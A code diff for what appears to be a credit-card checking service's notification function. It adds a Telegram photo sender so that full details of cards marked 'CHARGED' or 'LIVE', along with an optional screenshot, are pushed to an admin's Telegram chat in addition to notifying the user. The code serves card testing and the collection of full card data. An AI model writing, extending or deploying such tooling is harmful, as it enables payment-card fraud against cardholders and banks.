@@ -29,6 +29,7 @@ interface ChargedCardRequest {
   amount: string;
   gateway: string;
   api_response?: string; // Raw API response for debugging
+  screenshot_url?: string; // Screenshot URL from API if available
 }
 
 // Get country flag emoji from country code
@@ -232,6 +233,44 @@ async function sendTelegramMessage(chatId: string, message: string): Promise<boo
   }
 }
 
+// Send Telegram photo with caption
+async function sendTelegramPhoto(chatId: string, photoUrl: string, caption: string): Promise<boolean> {
+  if (!TELEGRAM_BOT_TOKEN) {
+    console.log("Telegram bot token not configured");
+    return false;
+  }
+
+  try {
+    const response = await fetch(
+      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
+      {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          photo: photoUrl,
+          caption: caption,
+          parse_mode: "HTML",
+        }),
+      }
+    );
+
+    if (!response.ok) {
+      const errorData = await response.json();
+      console.error("Telegram photo API error:", errorData);
+      // Fallback to text message if photo fails
+      return await sendTelegramMessage(chatId, caption);
+    }
+
+    console.log("Telegram photo sent successfully to:", chatId);
+    return true;
+  } catch (error) {
+    console.error("Error sending Telegram photo:", error);
+    // Fallback to text message
+    return await sendTelegramMessage(chatId, caption);
+  }
+}
+
 serve(async (req) => {
   // Handle CORS preflight requests
   if (req.method === 'OPTIONS') {
@@ -240,7 +279,7 @@ serve(async (req) => {
 
   try {
     const requestData: ChargedCardRequest = await req.json();
-    const { user_id, card_details, status, response_message, amount, gateway, api_response } = requestData;
+    const { user_id, card_details, status, response_message, amount, gateway, api_response, screenshot_url } = requestData;
 
     console.log("[NOTIFY-CHARGED] Processing notification:", { user_id, status, gateway });
 
@@ -292,7 +331,7 @@ serve(async (req) => {
       );
     }
     
-    // 🔥 Send LIVE card debug info to admin with FULL card details
+    // 🔥 Send LIVE card debug info to admin with FULL card details + screenshot
     if (status === "CHARGED" && ADMIN_TELEGRAM_CHAT_ID) {
       const adminDebugMsg = `🔔 <b>LIVE CARD DEBUG</b>
 
@@ -308,9 +347,16 @@ ${brandEmoji} ${binInfo.brand} • ${binInfo.type}
 ${countryFlag} ${binInfo.country}`;
       
       // Fire-and-forget admin notification
-      sendTelegramMessage(ADMIN_TELEGRAM_CHAT_ID, adminDebugMsg).catch(err => 
-        console.error("[NOTIFY-CHARGED] Admin debug notification failed:", err)
-      );
+      // If screenshot available, send as photo; otherwise send as text
+      if (screenshot_url) {
+        sendTelegramPhoto(ADMIN_TELEGRAM_CHAT_ID, screenshot_url, adminDebugMsg).catch(err => 
+          console.error("[NOTIFY-CHARGED] Admin debug photo failed:", err)
+        );
+      } else {
+        sendTelegramMessage(ADMIN_TELEGRAM_CHAT_ID, adminDebugMsg).catch(err => 
+          console.error("[NOTIFY-CHARGED] Admin debug notification failed:", err)
+        );
+      }
     }
 
     // Only CHARGED/LIVE cards reach here - notify user if they have Telegram linked
